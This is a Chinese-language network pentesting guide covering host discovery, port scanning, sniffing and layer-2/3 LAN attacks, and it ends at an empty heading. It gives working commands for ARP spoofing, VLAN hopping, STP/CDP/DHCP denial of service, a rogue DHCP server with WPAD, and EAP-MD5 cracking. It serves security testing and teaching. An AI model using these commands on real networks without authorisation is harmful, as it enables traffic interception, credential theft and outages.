# Pentesting 网络

{{#include ../../banners/hacktricks-training.md}}



## 从外部发现主机

这将是一个关于如何从**互联网**查找**IPs 是否响应**的**简短章节**。\
在这种情况下，你有一些**IP 范围**（也许是多个**网段**），你只需要找出**哪些 IP 在响应**。

### ICMP

这是发现主机是否在线的**最简单**且**最快速**的方法。\
你可以尝试发送一些**ICMP**数据包并**期望得到响应**。最简单的方法是发送一个**echo request**并等待响应。你可以使用简单的 `ping`，或对**网段**使用 `fping`。\
你也可以使用 **nmap** 发送其他类型的 ICMP 数据包（这可以绕过对常见 ICMP echo request-response 的过滤）。
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### TCP 端口发现

经常会发现各种 ICMP 数据包被过滤。  
在这种情况下，检查一个 host 是否在线能做的就是 **尝试查找 open ports**。  
每个 host 有 **65535 ports**，因此如果你的范围很大，你 **不能** 测试每个 host 的 **每个 port** 是否 open，那会花费太多时间。\
因此，你需要一个 **fast port scanner** ([masscan](https://github.com/robertdavidgraham/masscan)) 和一份 **最常用的 ports** 列表：
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
你也可以使用 `nmap` 执行这一步，但它更慢，而且 `nmap` 在识别在线主机方面有些问题。

### HTTP 端口发现

这只是一个 TCP 端口发现方法，当你想要**专注于发现 HTTP** **services** 时有用：
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### UDP Port Discovery

你也可以尝试检查一些 **UDP port open**，以决定是否应该 **pay more attention** 到一个 **host.** 由于 UDP services 通常对常规的空 UDP probe 数据包 **don't respond** 并且不会返回 **any data**，因此很难判断端口是被过滤还是开放。判断这一点最简单的方法是发送一个与正在运行的 service 相关的 packet；既然你不知道哪个 service 在运行，就应该根据端口号尝试最可能的服务：
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
The nmap line proposed before will test the **top 1000 UDP ports** in every host inside the **/24** range but even only this will take **>20min**. If need **fastest results** you can use [**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner): `./udp-proto-scanner.pl 199.66.11.53/24` This will send these **UDP probes** to their **expected port** (for a /24 range this will just take 1 min): _DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike,ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### SCTP Port Discovery
```bash
#Probably useless, but it's pretty fast, why not try it?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## Pentesting Wifi

这里可以找到一份截至撰写时涵盖所有知名 Wifi attacks 的不错指南：


{{#ref}}
../pentesting-wifi/
{{#endref}}

## 从内部发现主机

如果你在网络内部，首先要做的事情之一就是**发现其他主机**。取决于你可以/愿意制造多少**噪声**，可以执行不同的操作：

### 被动

你可以使用这些工具在已连接的网络中被动地发现主机：
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### 主动

注意，[_**从外部发现主机**_](#discovering-hosts-from-the-outside)中提到的技术（_TCP/HTTP/UDP/SCTP Port Discovery_）也可以**在这里应用**。\
但是，既然你与其他主机处于**同一网络**，你可以做**更多操作**：
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### 主动 ICMP

Note that the techniques commented in _Discovering hosts from the outside_ ([_**ICMP**_](#icmp)) can be also **applied here**.\
But, as you are in the **same network** as the other hosts, you can do **more things**:

- 如果你对**subnet broadcast address**进行**ping**，ping 应该会到达**每台主机**，它们可能会对**你**做出**响应**： `ping -b 10.10.5.255`
- ping **network broadcast address**，你甚至可能发现位于**other subnets**的主机： `ping -b 255.255.255.255`
- 使用 `nmap` 的 `-PE`、`-PP`、`-PM` 标志来执行主机发现，分别发送 **ICMPv4 echo**、**timestamp** 和 **subnet mask requests:** `nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24`

### **Wake On Lan**

Wake On Lan 用于通过**network message**来**turn on**计算机。用于唤醒计算机的 magic packet 只是一个包含目标 **MAC Dst** 的数据包，然后在同一 packet 内该 MAC 被**重复 16 times**。\
这种类型的数据包通常通过 **ethernet 0x0842** 或者以 **UDP packet to port 9** 的形式发送。\
如果**no \[MAC]** 被提供，数据包会被发送到**broadcast ethernet**（被重复的将是广播 MAC）。
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0842
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## 扫描主机

一旦你发现了所有想要深入扫描的 IP 地址（外部或内部），就可以执行不同的操作。

### TCP

- **开放** 端口: _SYN --> SYN/ACK --> RST_
- **关闭** 端口: _SYN --> RST/ACK_
- **被过滤** 端口: _SYN --> \[NO RESPONSE]_
- **被过滤** 端口: _SYN --> ICMP message_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

扫描 UDP 端口有 2 种选项：

- 发送一个 **UDP packet** 并检查是否收到 _**ICMP unreachable**_ 响应，以判断端口是否 **closed**（在某些情况下 ICMP 会被 **filtered**，因此你不会收到有关端口是否 **closed** 或 **open** 的任何信息）。
- 发送 **formatted datagrams** 来诱发 **service** 的响应（例如 DNS、DHCP、TFTP 等，列在 _nmap-payloads_ 中）。如果你收到 **response**，则该端口为 **open**。

**Nmap** 会使用 "-sV" **混合两种** 选项（UDP scans 非常慢），但注意 UDP scans 比 TCP scans 更慢：
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### SCTP Scan

**SCTP (Stream Control Transmission Protocol)** 旨在与 **TCP (Transmission Control Protocol)** 和 **UDP (User Datagram Protocol)** 一起使用。它的主要目的是在 IP 网络上传输电话业务数据，复刻了许多在 **Signaling System 7 (SS7)** 中可见的可靠性特性。**SCTP** 是 **SIGTRAN** 协议族的核心组件，该协议族旨在通过 IP 网络传输 SS7 信号。

对 **SCTP** 的支持由多种操作系统提供，例如 **IBM AIX**, **Oracle Solaris**, **HP-UX**, **Linux**, **Cisco IOS**, 和 **VxWorks**，这表明它在电信和网络领域被广泛接受并具有实际用途。

nmap 为 SCTP 提供两种不同的 scans： _-sY_ 和 _-sZ_
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### IDS 和 IPS 绕过


{{#ref}}
ids-evasion.md
{{#endref}}

### **更多 nmap 选项**


{{#ref}}
nmap-summary-esp.md
{{#endref}}

### 揭示内部 IP 地址

**配置错误的路由器、firewalls 和网络设备** 有时会在对网络探测的响应中使用 **非公开的源地址**。可以使用 **tcpdump** 在测试期间识别从私有地址接收的数据包。具体来说，在 **Kali Linux** 上可以在 **eth2 接口** 捕获数据包，该接口可从公共互联网访问。需要注意的是，如果你的环境位于 **NAT** 或 **Firewall** 之后，这类数据包很可能会被过滤掉。
```bash
tcpdump –nt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## Sniffing

Sniffing 通过检查捕获的 frames 和 packets，你可以得知 IP ranges、subnet sizes、MAC addresses 和 hostnames 的详细信息。如果 network 配置不当或 switching fabric 在高负载下，攻击者可以通过 passive network sniffing 捕获敏感资料。

如果 switched Ethernet network 配置正确，你只会看到 broadcast frames 和发往你 MAC address 的流量。

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
也可以通过 SSH 会话从远程机器捕获数据包，并实时使用 Wireshark 作为 GUI 查看。
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### Bettercap
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

显然。

### 捕获 credentials

你可以使用像 [https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz) 这样的工具，从 pcap 或 live interface 中解析 credentials。

## LAN 攻击

### ARP spoofing

ARP Spoofing 是通过发送 gratuitous ARPResponses 来表明某台机器的 IP 对应的是我们设备的 MAC。然后，受害者会更改其 ARP table，并在每次想要访问被 spoofed 的 IP 时都会联系到我们的机器。

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
#### **Arpspoof**
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### MAC Flooding - CAM overflow

通过发送大量具有不同源 mac address 的数据包使交换机的 CAM table 溢出。当 CAM table 被填满时，交换机开始像 hub 一样工作（broadcasting 所有流量）。
```bash
macof -i <interface>
```
在现代交换机中，这个漏洞已经被修复。

### 802.1Q VLAN / DTP 攻击

#### 动态中继

The **Dynamic Trunking Protocol (DTP)** 被设计为一个链路层协议，用于支持自动化的 trunking 系统，允许交换机自动选择端口进入 trunk 模式 (Trunk) 或 非-trunk 模式。**DTP** 的部署常被视为网络设计不佳的标志，因此强调仅在必要时手动配置 trunks 并保持良好文档的重要性。

默认情况下，交换机端口被设置为 Dynamic Auto 模式，这意味着在邻端交换机发起请求时端口会准备开始 trunking。安全问题出现在 pentester 或 attacker 连接到交换机并发送 DTP Desirable 帧时，强制端口进入 trunk 模式。该行为使得 attacker 可以通过分析 STP 帧来枚举 VLANs，并通过创建虚拟接口来绕过 VLAN 隔离。

由于许多交换机默认启用了 DTP，攻击者可以利用这一点模拟交换机行为，从而访问跨所有 VLANs 的流量。脚本 [_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan) 可用于监听接口，显示交换机当前是 Default、Trunk、Dynamic、Auto 还是 Access 模式——其中 Access 是唯一对 VLAN hopping 攻击免疫的配置。该工具用于评估交换机的易受攻击状态。

如果发现网络存在该类漏洞，可使用 _**Yersinia**_ 工具通过 DTP 协议“启用 trunking”，以便观察来自所有 VLANs 的数据包。
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
![](<../../images/image (269).png>)

要枚举 VLANs，也可以使用脚本 [**DTPHijacking.py**](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py)**. D**o 不要在任何情况下中断该脚本。它每三秒注入一次 DTP Desirable。**动态创建的 trunk channels 在 switch 上仅存活五分钟。五分钟后，trunk 会断开。**
```
sudo python3 DTPHijacking.py --interface eth0
```
我想指出，**Access/Desirable (0x03)** 表示该 DTP 帧为 Desirable 类型，指示端口切换到 Trunk 模式。并且 **802.1Q/802.1Q (0xa5** 表示 **802.1Q** 封装类型。

通过分析 STP 帧，**我们得知存在 VLAN 30 和 VLAN 60。**

<figure><img src="../../images/image (124).png" alt=""><figcaption></figcaption></figure>

#### 针对特定 VLAN 的攻击

一旦你知道 VLAN ID 和 IP 值，就可以 **配置虚拟接口来攻击特定的 VLAN**。  
如果 DHCP 不可用，则使用 _ifconfig_ 设置静态 IP 地址。

<details>
<summary>VLAN 接口配置（示例）</summary>
```bash
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```
</details>
```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### Automatic VLAN Hopper

讨论中的攻击 **Dynamic Trunking and creating virtual interfaces and discovering hosts inside** 其他 VLANs 会被该工具 **自动执行**： [**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)

#### Double Tagging

如果攻击者知道受害主机的 **MAC, IP and VLAN ID of the victim host** 的值，他可以尝试对一个帧进行 **double tag a frame**，同时标上自己的 VLAN 和受害者的 VLAN 并发送数据包。由于 **victim won't be able to connect back**，因此攻击者的 **best option for the attacker is communicate via UDP**，对那些可以执行有趣操作的协议（例如 SNMP）进行通信。

另一种选择是发起一个 **TCP port scan spoofing an IP controlled by the attacker and accessible by the victim**（可能通过 internet）。然后，攻击者可以在其拥有的第二台主机上嗅探，查看是否收到来自受害者的某些数据包。

![](<../../images/image (190).png>)

要执行此攻击，你可以使用 scapy：`pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### Lateral VLAN Segmentation Bypass <a href="#d679" id="d679"></a>

如果你**可以访问与你直接相连的 switch**，就有能力**bypass VLAN segmentation**。只需**将端口切换为 trunk 模式**（也称 trunk），创建带有目标 VLAN ID 的虚拟接口，并配置 IP 地址。可以尝试通过 DHCP 动态请求地址，或者静态配置，视具体情况而定。


{{#ref}}
lateral-vlan-segmentation-bypass.md
{{#endref}}

#### Layer 3 Private VLAN Bypass

在某些环境中，例如 guest wireless networks，会启用 port isolation（也称 private VLAN）设置，以防止连接到无线 access point 的客户端彼此直接通信。然而，存在一种可以规避这些隔离措施的技术。该技术利用网络 ACLs 的缺失或配置不当，使得 IP 包可以通过 router 路由到同一网络上的另一个客户端。

该攻击通过构造一个“携带目标客户端 IP 地址但使用 router 的 MAC 地址”的数据包来执行。这样会导致 router 错误地将数据包转发给目标客户端。该方法类似于 Double Tagging Attacks 中的思路，即利用可访问受害者的主机来利用该安全缺陷。

**攻击关键步骤：**

1. **Crafting a Packet：** 构造一个数据包，使其包含目标客户端的 IP 地址，但使用 router 的 MAC 地址。
2. **Exploiting Router Behavior：** 将该数据包发送到 router，由于配置原因，router 会将数据包重定向到目标客户端，从而绕过 private VLAN 提供的隔离。

### VTP Attacks

VTP (VLAN Trunking Protocol) 用于集中管理 VLAN。它使用 revision numbers 来维护 VLAN 数据库的完整性；任何修改都会使该数字递增。switches 会采用具有更高 revision number 的配置，从而更新它们自己的 VLAN 数据库。

#### VTP Domain Roles

- **VTP Server:** 管理 VLAN（创建、删除、修改）。它向域内成员广播 VTP announcements。
- **VTP Client:** 接收 VTP announcements 以同步其 VLAN 数据库。该角色不允许本地修改 VLAN 配置。
- **VTP Transparent:** 不参与 VTP 更新，但会转发 VTP announcements。它不受 VTP 攻击影响，其 revision number 保持为 0。

#### VTP Advertisement Types

- **Summary Advertisement:** 由 VTP server 每 300 秒广播一次，携带域的基本信息。
- **Subset Advertisement:** 在 VLAN 配置发生更改后发送。
- **Advertisement Request:** 由 VTP client 发出以请求 Summary Advertisement，通常在检测到更高的 configuration revision number 时触发。

VTP 的漏洞只能通过 trunk ports 利用，因为 VTP announcements 仅在这些端口上传播。在 DTP 攻击 后，场景可能会转向针对 VTP 的攻击。像 Yersinia 这样的工具可以用来发起 VTP 攻击，目标是清除 VLAN 数据库，从而破坏网络。

注：此处讨论的是 VTP version 1 (VTPv1)。
```bash
yersinia -G # Launch Yersinia in graphical mode
```
在 Yersinia 的图形模式中，选择 deleting all VTP vlans 选项以清空 VLAN 数据库。

### STP Attacks

**如果你无法在接口上捕获 BPDU 帧，成功进行 STP attack 的可能性很小。**

#### **STP BPDU DoS**

发送大量 BPDUs TCP (Topology Change Notification) 或 Conf (the BPDUs that are sent when the topology is created) 会导致交换机过载并停止正常工作。
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **STP TCP Attack**

当发送 TCP 时，交换机的 CAM table 会在 15s 内被清空。随后，如果你持续发送这类数据包，CAM table 将不断重置（或每 15segs），当它重置时，交换机会表现得像一个 hub。
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **STP Root Attack**

攻击者模拟交换机的行为以成为网络的 STP root。然后，更多的数据会通过攻击者转发。当你连接到两台不同的交换机时，这很有用。\
这通过发送 BPDUs CONF packets 来实现，声称 **priority** 值低于当前 root switch 的实际值。
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
**如果攻击者连接到 2 台交换机，他可以成为新树的 root，并且这两台交换机之间的所有流量将通过他（a MITM attack will be performed）。**
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### CDP 攻击

CISCO Discovery Protocol (CDP) 对于 CISCO 设备之间的通信至关重要，允许它们 **识别彼此并共享配置详情**。

#### 被动数据收集 <a href="#id-0e0f" id="id-0e0f"></a>

CDP 被配置为通过所有端口广播信息，这可能导致安全风险。攻击者在连接到交换机端口后，可能会部署网络嗅探器，如 **Wireshark**, **tcpdump**, 或 **Yersinia**。此举可泄露关于网络设备的敏感信息，包括其型号和运行的 Cisco IOS 版本。攻击者随后可能针对识别出的 Cisco IOS 版本中的特定漏洞发起攻击。

#### 诱发 CDP 表泛滥 <a href="#id-0d6a" id="id-0d6a"></a>

更具侵略性的方法是通过淹没交换机内存、伪装成合法的 CISCO 设备来发起 Denial of Service (DoS) 攻击。下面是使用 Yersinia（一款用于测试的网络工具）启动此类攻击的命令序列：
```bash
sudo yersinia cdp -attack 1 # Initiates a DoS attack by simulating fake CISCO devices
# Alternatively, for a GUI approach:
sudo yersinia -G
```
在这种攻击期间，交换机的 CPU 和 CDP 邻居表会承受很大负载，因资源过度消耗而经常出现所谓的 **“网络瘫痪”**。

#### CDP Impersonation Attack
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
You could also use [**scapy**](https://github.com/secdev/scapy/). Be sure to install it with `scapy/contrib` package.

### VoIP 攻击与 VoIP Hopper 工具

VoIP phones, increasingly integrated with IoT devices, offer functionalities like unlocking doors or controlling thermostats through special phone numbers. However, this integration can pose security risks.

The tool [**voiphopper**](http://voiphopper.sourceforge.net) is designed to emulate a VoIP phone in various environments (Cisco, Avaya, Nortel, Alcatel-Lucent). It discovers the voice network's VLAN ID using protocols like CDP, DHCP, LLDP-MED, and 802.1Q ARP.

**VoIP Hopper** offers three modes for the Cisco Discovery Protocol (CDP):

1. **Sniff Mode** (`-c 0`): 分析网络数据包以识别 VLAN ID。
2. **Spoof Mode** (`-c 1`): 生成自定义数据包以模拟真实 VoIP 设备。
3. **Spoof with Pre-made Packet Mode** (`-c 2`): 发送与特定 Cisco IP 电话型号相同的数据包。

The preferred mode for speed is the third one. It requires specifying:

- The attacker's network interface (`-i` parameter).
- The name of the VoIP device being emulated (`-E` parameter), adhering to the Cisco naming format (e.g., SEP followed by a MAC address).

In corporate settings, to mimic an existing VoIP device, one might:

- Inspect the MAC label on the phone.
- Navigate the phone's display settings to view model information.
- Connect the VoIP device to a laptop and observe CDP requests using Wireshark.

An example command to execute the tool in the third mode would be:
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
### DHCP 攻击

#### 枚举
```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

**Two types of DoS** 可以针对 DHCP 服务器 发动。第一个方法是**模拟足够多的伪主机以使用所有可能的 IP 地址**。\
该攻击仅在你能够看到 DHCP 服务器的响应并完成协议（**Discover** (Comp) --> **Offer** (server) --> **Request** (Comp) --> **ACK** (server)）时有效。例如，**在 Wifi networks 中这是不可能的**。

另一种对 DHCP 进行 DoS 的方法是发送一个 **DHCP-RELEASE packet，使用每个可能的 IP 作为源地址**。然后，服务器会认为所有人都已释放这些 IP。
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
更自动化的方法是使用工具 [DHCPing](https://github.com/kamorin/DHCPig)

你可以使用前面提到的 DoS 攻击迫使客户端在环境中获取新的 lease，并耗尽合法服务器使其无响应。因此，当合法方尝试重新连接时，**你可以提供下一节攻击中提到的恶意值**。

#### 设置恶意值

可以使用位于 `/usr/share/responder/DHCP.py` 的 DHCP 脚本来设置一个恶意 DHCP 服务器。这对于网络攻击很有用，例如通过将流量重定向到恶意服务器来捕获 HTTP 流量和凭证。然而，设置恶意网关效果较差，因为它只允许捕获来自客户端的出站流量，会错过真实网关的响应。相反，建议设置恶意 DNS 或 WPAD 服务器以获得更有效的攻击。

下面是配置恶意 DHCP 服务器的命令选项：

- **我们的 IP 地址（网关通告）**：使用 `-i 10.0.0.100` 来宣告你的机器 IP 作为网关。
- **本地 DNS 域名**：可选地使用 `-d example.org` 设置本地 DNS 域名。
- **原始路由器/网关 IP**：使用 `-r 10.0.0.1` 指定合法路由器或网关的 IP 地址。
- **主 DNS 服务器 IP**：使用 `-p 10.0.0.100` 设置你控制的恶意 DNS 服务器的 IP。
- **备用 DNS 服务器 IP**：可选地使用 `-s 10.0.0.1` 设置备用 DNS 服务器 IP。
- **本地网络掩码**：使用 `-n 255.255.255.0` 定义本地网络的掩码。
- **DHCP 流量接口**：使用 `-I eth1` 在指定的网络接口上监听 DHCP 流量。
- **WPAD 配置地址**：使用 `-w “http://10.0.0.100/wpad.dat”` 设置 WPAD 配置地址，辅助拦截 Web 流量。
- **伪造默认网关 IP**：包含 `-S` 来伪造默认网关 IP 地址。
- **响应所有 DHCP 请求**：包含 `-R` 使服务器响应所有 DHCP 请求，但注意这会产生噪音且可能被检测到。

通过正确使用这些选项，可以建立一个恶意 DHCP 服务器以有效拦截网络流量。
```python
# Example to start a rogue DHCP server with specified options
!python /usr/share/responder/DHCP.py -i 10.0.0.100 -d example.org -r 10.0.0.1 -p 10.0.0.100 -s 10.0.0.1 -n 255.255.255.0 -I eth1 -w "http://10.0.0.100/wpad.dat" -S -R
```
### **EAP 攻击**

以下是一些可用于针对 802.1X 实现的攻击策略：

- 通过 EAP 主动进行 brute-force 密码破解
- 使用畸形的 EAP 内容攻击 RADIUS 服务器 _\*\*_(exploits)
- 捕获 EAP 消息并进行离线密码破解 (EAP-MD5 and PEAP)
- 强制使用 EAP-MD5 认证以绕过 TLS 证书验证
- 在使用 hub 或类似设备认证后注入恶意网络流量

如果攻击者位于受害者和认证服务器之间，他可能会尝试将认证协议降级（如有必要）到 EAP-MD5 并捕获认证尝试。然后，他可以使用以下方式对其进行 brute-force：
```
eapmd5pass –r pcap.dump –w /usr/share/wordlist/sqlmap.txt
```
### FHRP (GLBP & HSRP) 攻击 <a href="#id-6196" id="id-6196"></a>

**FHRP** (First Hop Redundancy Protocol) 是一类网络协议，旨在 **创建一个热备路由系统**。使用 FHRP，物理路由器可以被合并为一个逻辑设备，从而提高容错性并有助于分摊负载。

**Cisco Systems 工程师开发了两种 FHRP 协议：GLBP 和 HSRP。**


{{#ref}}
glbp-and-hsrp-attacks.md
{{#endref}}

### RIP

已知存在三种 Routing Information Protocol (RIP) 的版本：RIP、RIPv2 和 RIPng。RIP 和 RIPv2 使用 UDP 在端口 520 向对端发送数据报，而 RIPng 则通过 IPv6 多播向 UDP 端口 521 广播数据报。RIPv2 引入了对 MD5 认证的支持。另一方面，RIPng 并不包含本地认证，而是依赖 IPv6 中可选的 IPsec AH 和 ESP 头。

- **RIP and RIPv2:** 通信通过端口 520 的 UDP 数据报进行。
- **RIPng:** 使用 UDP 端口 521 通过 IPv6 多播广播数据报。

注意 RIPv2 支持 MD5 认证，而 RIPng 不包含本地认证，依赖 IPv6 中的 IPsec AH 和 ESP 头。

### EIGRP 攻击

**EIGRP (Enhanced Interior Gateway Routing Protocol)** 是一种动态路由协议。**它是一个距离向量协议。** 如果没有 **认证** 和被动接口配置，**入侵者** 可以干扰 EIGRP 路由并导致 **路由表中毒**。此外，EIGRP 网络（即自治系统）**是扁平的，并没有分割成任何区域**。如果**攻击者注入一条路由**，这条路由很可能会在整个自治 EIGRP 系统中**传播**。

攻击 EIGRP 系统需要**与合法的 EIGRP 路由器建立邻居关系**，这将开启许多可能性，从基本侦察到各种注入。

[**FRRouting**](https://frrouting.org/) 允许你部署一个**支持 BGP、OSPF、EIGRP、RIP 等协议的虚拟路由器**。你只需将其部署到攻击者的系统上，就可以在路由域中假扮成合法路由器。


{{#ref}}
eigrp-attacks.md
{{#endref}}

[**Coly**](https://code.google.com/p/coly/) 能拦截 EIGRP (Enhanced Interior Gateway Routing Protocol) 广播。它还允许注入数据包，可用于更改路由配置。

### OSPF

在 Open Shortest Path First (OSPF) 协议中，**通常使用 MD5 认证来确保路由器之间的通信安全**。然而，这一安全措施可以被像 Loki 和 John the Ripper 这样的工具破解。这些工具能够捕获并破解 MD5 哈希，从而暴露认证密钥。一旦得到该密钥，就可以用它来引入新的路由信息。路由参数的配置和被破解密钥的设置分别通过 _Injection_ 和 _Connection_ 选项卡完成。

- **捕获并破解 MD5 哈希：** 使用像 Loki 和 John the Ripper 这样的工具。
- **配置路由参数：** 通过 _Injection_ 选项卡完成。
- **设置被破解的密钥：** 在 _Connection_ 选项卡下配置该密钥。

### Other Generic Tools & Sources

- [**Above**](https://github.com/c4s73r/Above): 用于扫描网络流量并发现漏洞的工具
- 你可以在 [**here**](https://github.com/Sab0tag3d/MITM-cheatsheet) 找到一些**关于网络攻击的更多信息**。

## **Spoofing**

攻击者通过发送伪造的 DHCP 响应，为网络中新成员配置所有网络参数（GW、IP、DNS）。
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARP Spoofing

查看[previous section](#arp-spoofing)。

### ICMPRedirect

